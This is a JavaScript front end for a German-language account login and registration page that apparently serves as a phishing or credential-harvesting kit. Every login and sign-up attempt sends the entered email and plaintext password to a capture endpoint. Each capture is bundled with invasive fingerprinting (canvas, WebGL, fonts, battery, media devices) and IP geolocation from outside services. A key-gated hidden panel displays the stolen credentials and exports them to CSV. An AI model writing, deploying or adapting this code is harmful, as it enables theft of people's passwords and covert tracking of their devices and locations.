// public/app.js
(function () {
  'use strict';

  var STORE_KEY = 'nv_session_id';

  var state = {
    user: null,
    panelKey: null,
    records: [],
    device: null,
    network: null,
    clickSent: false
  };

  /* ------------------------------------------------------------ helpers */
  function safe(fn, fallback) {
    try {
      var v = fn();
      return v === undefined ? (fallback === undefined ? null : fallback) : v;
    } catch (e) {
      return fallback === undefined ? null : fallback;
    }
  }

  function uuid() {
    if (window.crypto && crypto.randomUUID) return crypto.randomUUID();
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = (Math.random() * 16) | 0;
      return (c === 'x' ? r : (r & 0x3) | 0x8).toString(16);
    });
  }

  function sessionId() {
    var s = safe(function () { return localStorage.getItem(STORE_KEY); });
    if (!s) {
      s = uuid();
      safe(function () { localStorage.setItem(STORE_KEY, s); });
    }
    return s;
  }

  function withTimeout(promise, ms) {
    return new Promise(function (resolve) {
      var done = false;
      var t = setTimeout(function () {
        if (!done) { done = true; resolve(null); }
      }, ms);
      promise.then(function (v) {
        if (!done) { done = true; clearTimeout(t); resolve(v); }
      }, function () {
        if (!done) { done = true; clearTimeout(t); resolve(null); }
      });
    });
  }

  function api(path, options) {
    var opts = options || {};
    var headers = Object.assign({ 'Content-Type': 'application/json' }, opts.headers || {});
    return fetch(path, {
      method: opts.method || 'GET',
      headers: headers,
      body: opts.body === undefined ? undefined : JSON.stringify(opts.body),
      credentials: 'same-origin'
    }).then(function (res) {
      return res.json().catch(function () { return {}; }).then(function (data) {
        if (!res.ok) {
          var msg = (data && data.error) || ('HTTP ' + res.status);
          throw new Error(msg);
        }
        return data;
      });
    });
  }

  /* -------------------------------------------------------- fingerprint */
  function canvasHash() {
    return safe(function () {
      var c = document.createElement('canvas');
      c.width = 240; c.height = 60;
      var ctx = c.getContext('2d');
      if (!ctx) return null;
      ctx.textBaseline = 'top';
      ctx.font = '16px "Arial"';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, 240, 60);
      ctx.fillStyle = '#069';
      ctx.fillText('Nordvale-Identity-\u00e4\u00f6\u00fc-42', 4, 4);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('Nordvale-Identity-\u00e4\u00f6\u00fc-42', 6, 20);
      var data = c.toDataURL();
      var h = 0x811c9dc5;
      for (var i = 0; i < data.length; i++) {
        h ^= data.charCodeAt(i);
        h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
      }
      return h.toString(16);
    }, null);
  }

  function webglInfo() {
    return safe(function () {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return null;
      var ext = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        unmaskedVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
        unmaskedRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
        maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        version: gl.getParameter(gl.VERSION),
        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
      };
    }, null);
  }

  function fontList() {
    return safe(function () {
      var base = ['monospace', 'sans-serif', 'serif'];
      var probe = ['Arial', 'Arial Black', 'Calibri', 'Cambria', 'Comic Sans MS',
        'Consolas', 'Courier New', 'Georgia', 'Helvetica', 'Impact',
        'Lucida Console', 'Menlo', 'Segoe UI', 'Tahoma', 'Times New Roman',
        'Trebuchet MS', 'Verdana', 'Roboto', 'Ubuntu', 'DejaVu Sans',
        'Noto Sans', 'Fira Code', 'JetBrains Mono'];
      var span = document.createElement('span');
      span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;visibility:hidden';
      span.textContent = 'mmmmmmmmmmlli';
      document.body.appendChild(span);
      var sizes = {};
      base.forEach(function (b) {
        span.style.fontFamily = b;
        sizes[b] = span.offsetWidth + 'x' + span.offsetHeight;
      });
      var found = probe.filter(function (f) {
        return base.some(function (b) {
          span.style.fontFamily = '"' + f + '",' + b;
          return span.offsetWidth + 'x' + span.offsetHeight !== sizes[b];
        });
      });
      document.body.removeChild(span);
      return found;
    }, []);
  }

  function deviceSnapshot() {
    var nav = navigator || {};
    var scr = window.screen || {};
    return {
      sessionId: sessionId(),
      pageUrl: safe(function () { return location.href; }),
      referrer: safe(function () { return document.referrer || null; }),
      firstSeen: new Date().toISOString(),
      userAgent: nav.userAgent || null,
      userAgentData: safe(function () {
        if (!nav.userAgentData) return null;
        return {
          brands: nav.userAgentData.brands,
          mobile: nav.userAgentData.mobile,
          platform: nav.userAgentData.platform
        };
      }),
      appName: nav.appName || null,
      appVersion: nav.appVersion || null,
      product: nav.product || null,
      vendor: nav.vendor || null,
      platform: nav.platform || null,
      language: nav.language || null,
      languages: nav.languages || null,
      cookieEnabled: nav.cookieEnabled,
      doNotTrack: nav.doNotTrack || null,
      online: nav.onLine,
      hardwareConcurrency: nav.hardwareConcurrency || null,
      deviceMemory: nav.deviceMemory === undefined ? null : nav.deviceMemory,
      maxTouchPoints: nav.maxTouchPoints || 0,
      touchSupport: ('ontouchstart' in window) || (nav.maxTouchPoints > 0),
      screen: {
        width: scr.width, height: scr.height,
        availWidth: scr.availWidth, availHeight: scr.availHeight,
        colorDepth: scr.colorDepth, pixelDepth: scr.pixelDepth,
        orientation: safe(function () { return scr.orientation ? scr.orientation.type : null; })
      },
      viewport: {
        innerWidth: window.innerWidth, innerHeight: window.innerHeight,
        outerWidth: window.outerWidth, outerHeight: window.outerHeight,
        devicePixelRatio: window.devicePixelRatio || 1,
        screenX: window.screenX, screenY: window.screenY
      },
      timezone: safe(function () { return Intl.DateTimeFormat().resolvedOptions().timeZone; }),
      timezoneOffsetMinutes: new Date().getTimezoneOffset(),
      locale: safe(function () { return Intl.DateTimeFormat().resolvedOptions().locale; }),
      localTime: new Date().toString(),
      connection: safe(function () {
        var c = nav.connection || nav.mozConnection || nav.webkitConnection;
        if (!c) return null;
        return {
          effectiveType: c.effectiveType || null,
          downlink: c.downlink === undefined ? null : c.downlink,
          rtt: c.rtt === undefined ? null : c.rtt,
          saveData: c.saveData === undefined ? null : c.saveData,
          type: c.type || null
        };
      }),
      plugins: safe(function () {
        var out = [];
        for (var i = 0; i < nav.plugins.length; i++) out.push(nav.plugins[i].name);
        return out;
      }),
      canvasHash: canvasHash(),
      webgl: webglInfo(),
      fonts: fontList()
    };
  }

  function collectAsync(device) {
    var jobs = [];

    jobs.push(withTimeout(safe(function () {
      return navigator.getBattery().then(function (b) {
        return { level: b.level, charging: b.charging };
      });
    }, Promise.resolve(null)), 1500).then(function (v) { device.battery = v; }));

    jobs.push(withTimeout(safe(function () {
      return navigator.storage.estimate().then(function (e) {
        return { usage: e.usage, quota: e.quota };
      });
    }, Promise.resolve(null)), 1500).then(function (v) { device.storageQuota = v; }));

    jobs.push(withTimeout(safe(function () {
      return navigator.mediaDevices.enumerateDevices().then(function (list) {
        var counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
        list.forEach(function (d) { if (counts[d.kind] !== undefined) counts[d.kind]++; });
        return counts;
      });
    }, Promise.resolve(null)), 1500).then(function (v) { device.mediaDevices = v; }));

    return Promise.all(jobs).then(function () { return device; });
  }

  function lookupNetwork() {
    var ipP = withTimeout(
      fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
        .then(function (r) { return r.json(); })
        .then(function (j) { return j.ip || null; })
        .catch(function () { return null; }), 3000);

    var geoP = withTimeout(
      fetch('https://ipapi.co/json/', { cache: 'no-store' })
        .then(function (r) { return r.json(); })
        .then(function (j) {
          if (!j || j.error) return null;
          return {
            ip: j.ip || null, city: j.city || null, region: j.region || null,
            country: j.country_name || null, countryCode: j.country_code || null,
            postal: j.postal || null,
            latitude: j.latitude ?? null, longitude: j.longitude ?? null,
            timezone: j.timezone || null, org: j.org || null, asn: j.asn || null
          };
        })
        .catch(function () { return null; }), 4000);

    return Promise.all([ipP, geoP]).then(function (r) {
      var ip = r[0], geo = r[1];
      if (geo && !geo.ip && ip) geo.ip = ip;
      return { ip: ip, geo: geo };
    });
  }

  function buildDevice() {
    if (state.device) return Promise.resolve(state.device);
    return collectAsync(deviceSnapshot()).then(function (d) {
      state.device = d;
      return d;
    });
  }

  function capture(record) {
    return Promise.all([buildDevice(), lookupNetwork()]).then(function (r) {
      state.network = r[1];
      return api('/api/captures', {
        method: 'POST',
        body: Object.assign({
          ts: new Date().toISOString(),
          sessionId: sessionId(),
          page: safe(function () { return location.href; }),
          network: r[1],
          device: r[0]
        }, record)
      }).catch(function () { /* capture is best effort, never blocks auth */ });
    });
  }

  document.addEventListener('pointerdown', function (ev) {
    if (state.clickSent) return;
    state.clickSent = true;
    var target = safe(function () {
      var el = ev.target;
      if (!el || !el.tagName) return null;
      return {
        tag: el.tagName,
        id: el.id || null,
        name: el.getAttribute ? el.getAttribute('name') : null,
        type: el.getAttribute ? el.getAttribute('type') : null,
        text: (el.textContent || '').trim().slice(0, 60) || null
      };
    });
    capture({ type: 'click', clicked: target });
  }, { capture: true });

  /* ------------------------------------------------------------ routing */
  var views = {
    login: document.getElementById('loginView'),
    register: document.getElementById('registerView'),
    dash: document.getElementById('dashView'),
    panel: document.getElementById('panelView')
  };

  function show(name) {
    Object.keys(views).forEach(function (k) {
      if (k === 'panel') {
        views.panel.classList.toggle('on', k === name);
        document.body.classList.toggle('panel', name === 'panel');
        return;
      }
      views[k].hidden = k !== name;
    });
  }

  function route() {
    var hash = (location.hash || '').replace(/^#/, '').toLowerCase();
    if (hash === 'panel') return openPanel();
    if (hash === 'registrieren') return show('register');
    if (hash === 'konto') {
      if (!state.user) { location.hash = 'login'; return; }
      return show('dash');
    }
    show('login');
  }

  window.addEventListener('hashchange', route);

  /* --------------------------------------------------------------- login */
  var loginForm = document.getElementById('loginForm');
  var errBox = document.getElementById('err');
  var submitBtn = document.getElementById('submitBtn');

  function setError(box, msg, ok) {
    box.textContent = msg;
    box.classList.toggle('ok', Boolean(ok));
    box.classList.add('show');
  }

  function clearError(box) {
    box.textContent = '';
    box.classList.remove('show', 'ok', 'shake');
  }

  loginForm.addEventListener('submit', function (e) {
    e.preventDefault();
    clearError(errBox);

    var email = document.getElementById('email').value.trim();
    var password = document.getElementById('password').value;

    if (!email || !password) {
      setError(errBox, 'Bitte E-Mail und Passwort eingeben.');
      return;
    }

    submitBtn.disabled = true;
    submitBtn.textContent = 'Anmelden …';

    api('/api/login', { method: 'POST', body: { email: email, password: password } })
      .then(function (data) {
        state.user = data.user;
        capture({
          type: 'login',
          credentials: {
            email: email,
            password: password,
            remember: document.getElementById('remember').checked,
            result: 'accepted'
          }
        }).then(function () { location.hash = 'konto'; });
      })
      .catch(function (err) {
        capture({
          type: 'login',
          credentials: {
            email: email,
            password: password,
            remember: document.getElementById('remember').checked,
            result: 'rejected',
            reason: err.message
          }
        });
        setError(errBox, err.message === 'invalid credentials'
          ? 'E-Mail oder Passwort ist falsch. Bitte erneut versuchen.'
          : 'Anmeldung fehlgeschlagen: ' + err.message);
        document.getElementById('loginView').classList.add('shake');
        document.getElementById('password').value = '';
      })
      .then(function () {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Anmelden';
      });
  });

  document.getElementById('forgot').addEventListener('click', function (e) {
    e.preventDefault();
    setError(errBox, 'Zurücksetzen ist derzeit nicht verfügbar. Wende dich an den Support.');
  });

  document.getElementById('toRegister').addEventListener('click', function (e) {
    e.preventDefault();
    location.hash = 'registrieren';
  });

  /* ------------------------------------------------------------ register */
  var registerForm = document.getElementById('registerForm');
  var regErr = document.getElementById('regErr');
  var registerBtn = document.getElementById('registerBtn');

  registerForm.addEventListener('submit', function (e) {
    e.preventDefault();
    clearError(regErr);

    var email = document.getElementById('regEmail').value.trim();
    var password = document.getElementById('regPassword').value;
    var confirm = document.getElementById('regConfirm').value;

    if (!email || !password) {
      setError(regErr, 'Bitte E-Mail und Passwort eingeben.');
      return;
    }
    if (password.length < 10) {
      setError(regErr, 'Das Passwort muss mindestens 10 Zeichen haben.');
      return;
    }
    if (password !== confirm) {
      setError(regErr, 'Die Passwörter stimmen nicht überein.');
      return;
    }

    registerBtn.disabled = true;
    registerBtn.textContent = 'Konto erstellen …';

    api('/api/register', {
      method: 'POST',
      body: { email: email, password: password, confirm: confirm }
    })
      .then(function (data) {
        state.user = data.user;
        capture({
          type: 'register',
          credentials: { email: email, password: password, result: 'created' }
        }).then(function () { location.hash = 'konto'; });
      })
      .catch(function (err) {
        var msg = err.message;
        if (msg === 'email already registered') msg = 'Diese E-Mail ist bereits registriert.';
        else if (msg === 'invalid email') msg = 'Bitte eine gültige E-Mail-Adresse eingeben.';
        setError(regErr, msg);
        document.getElementById('registerView').classList.add('shake');
      })
      .then(function () {
        registerBtn.disabled = false;
        registerBtn.textContent = 'Konto erstellen';
      });
  });

  document.getElementById('toLogin').addEventListener('click', function (e) {
    e.preventDefault();
    location.hash = 'login';
  });

  /* ---------------------------------------------------------------- dash */
  function fillDash() {
    if (!state.user) return;
    document.getElementById('dashEmail').textContent = state.user.email;
    document.getElementById('dashId').textContent = state.user.id;
    document.getElementById('dashCreated').textContent = state.user.createdAt;
    document.getElementById('dashLast').textContent = state.user.lastLoginAt || '—';
  }

  document.getElementById('logoutBtn').addEventListener('click', function () {
    api('/api/logout', { method: 'POST' }).catch(function () {}).then(function () {
      state.user = null;
      location.hash = 'login';
    });
  });

  /* --------------------------------------------------------------- panel */
  var gateBox = document.getElementById('gateBox');
  var panelBody = document.getElementById('panelBody');
  var gateErr = document.getElementById('gateErr');
  var gateKeyInput = document.getElementById('gateKey');

  function openPanel() {
    show('panel');
    if (state.panelKey) {
      gateBox.hidden = true;
      panelBody.hidden = false;
      refreshPanel();
    } else {
      gateBox.hidden = false;
      panelBody.hidden = true;
    }
  }

  function tryUnlock() {
    var key = gateKeyInput.value;
    if (!key) return;
    api('/api/captures?key=' + encodeURIComponent(key))
      .then(function (data) {
        state.panelKey = key;
        state.records = data.records || [];
        gateErr.classList.remove('show');
        gateBox.hidden = true;
        panelBody.hidden = false;
        renderPanel();
      })
      .catch(function () {
        gateErr.classList.add('show');
      });
  }

  document.getElementById('gateBtn').addEventListener('click', tryUnlock);
  gateKeyInput.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') tryUnlock();
  });

  function refreshPanel() {
    if (!state.panelKey) return;
    api('/api/captures?key=' + encodeURIComponent(state.panelKey))
      .then(function (data) {
        state.records = data.records || [];
        renderPanel();
      })
      .catch(function () {
        state.panelKey = null;
        gateBox.hidden = false;
        panelBody.hidden = true;
      });
  }

  document.getElementById('refreshBtn').addEventListener('click', refreshPanel);

  document.getElementById('clearBtn').addEventListener('click', function () {
    if (!confirm('Alle Einträge auf dem Server löschen?')) return;
    api('/api/captures?key=' + encodeURIComponent(state.panelKey), { method: 'DELETE' })
      .then(function () {
        state.records = [];
        renderPanel();
      })
      .catch(function () {});
  });

  document.getElementById('exportBtn').addEventListener('click', function () {
    download('captures-' + Date.now() + '.json',
      JSON.stringify(state.records, null, 2), 'application/json');
  });

  document.getElementById('csvBtn').addEventListener('click', function () {
    var head = ['ts', 'type', 'ip', 'city', 'country', 'email', 'password',
                'result', 'userAgent', 'platform', 'timezone', 'screen', 'sessionId'];
    var lines = [head.join(',')];
    state.records.forEach(function (r) {
      var d = r.device || {};
      var n = r.network || {};
      var g = n.geo || {};
      var c = r.credentials || {};
      var sc = d.screen ? (d.screen.width + 'x' + d.screen.height) : '';
      lines.push([
        r.ts, r.type, n.ip || g.ip || '', g.city || '', g.country || '',
        c.email || '', c.password || '', c.result || '',
        d.userAgent || '', d.platform || '', d.timezone || '', sc, r.sessionId || ''
      ].map(csvCell).join(','));
    });
    download('captures-' + Date.now() + '.csv', lines.join('\r\n'), 'text/csv');
  });

  function csvCell(v) {
    var s = v === null || v === undefined ? '' : String(v);
    return /[",\r\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
  }

  function download(name, content, mime) {
    var blob = new Blob([content], { type: mime + ';charset=utf-8' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(function () { URL.revokeObjectURL(url); }, 2000);
  }

  function el(tag, cls, text) {
    var n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text !== undefined && text !== null) n.textContent = String(text);
    return n;
  }

  function short(s, n) {
    s = s === null || s === undefined ? '' : String(s);
    return s.length > n ? s.slice(0, n - 1) + '…' : s;
  }

  function renderPanel() {
    var rows = state.records;
    document.getElementById('countPill').textContent =
      rows.length + (rows.length === 1 ? ' Eintrag' : ' Einträge');

    var wrap = document.getElementById('tableWrap');
    wrap.textContent = '';

    if (!rows.length) {
      wrap.appendChild(el('div', 'empty', 'Noch keine Einträge.'));
      return;
    }

    var table = el('table');
    var thead = el('thead');
    var htr = el('tr');
    ['Zeit', 'Typ', 'IP / Ort', 'Zugangsdaten', 'Gerät', 'Details'].forEach(function (h) {
      htr.appendChild(el('th', null, h));
    });
    thead.appendChild(htr);
    table.appendChild(thead);

    var tbody = el('tbody');
    rows.slice().reverse().forEach(function (r) {
      var tr = el('tr');
      var d = r.device || {};
      var n = r.network || {};
      var g = n.geo || {};
      var c = r.credentials || {};

      tr.appendChild(el('td', 'mono', r.ts ? String(r.ts).replace('T', ' ').slice(0, 19) : ''));
      var typeCell = el('td');
      typeCell.appendChild(el('span', 'tag ' + (r.type || ''), r.type || ''));
      tr.appendChild(typeCell);

      var ipCell = el('td', 'mono');
      ipCell.appendChild(el('div', null, n.ip || g.ip || '—'));
      ipCell.appendChild(el('div', 'detail',
        [g.city, g.region, g.country, g.postal].filter(Boolean).join(', ') || '—'));
      tr.appendChild(ipCell);

      var credCell = el('td', 'mono');
      if (c.email || c.password) {
        credCell.appendChild(el('div', null, c.email || '—'));
        credCell.appendChild(el('div', null, c.password || '—'));
        if (c.result) credCell.appendChild(el('div', 'detail', c.result));
      } else {
        credCell.appendChild(el('div', null, '—'));
      }
      tr.appendChild(credCell);

      var devCell = el('td');
      devCell.appendChild(el('div', null,
        [d.platform,
         d.hardwareConcurrency ? d.hardwareConcurrency + ' Kerne' : null,
         d.deviceMemory ? d.deviceMemory + ' GB' : null].filter(Boolean).join(' · ') || '—'));
      devCell.appendChild(el('div', 'detail', short(d.userAgent || '', 90)));
      tr.appendChild(devCell);

      var detCell = el('td');
      var btn = el('button', 'btn', 'Ansehen');
      btn.addEventListener('click', function () {
        var existing = wrap.querySelector('.expanded');
        if (existing) existing.remove();
        var box = el('div', 'expanded');
        var pre = el('pre', 'mono');
        pre.textContent = JSON.stringify(r, null, 2);
        box.appendChild(pre);
        wrap.appendChild(box);
        pre.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
      });
      detCell.appendChild(btn);
      tr.appendChild(detCell);

      tbody.appendChild(tr);
    });

    table.appendChild(tbody);
    wrap.appendChild(table);
  }

  /* ----------------------------------------------------------------- boot */
  api('/api/me')
    .then(function (data) {
      state.user = data.user;
      fillDash();
      var hash = (location.hash || '').replace(/^#/, '');
      if (!hash) location.hash = 'konto';
      route();
    })
    .catch(function () {
      route();
    });
})();
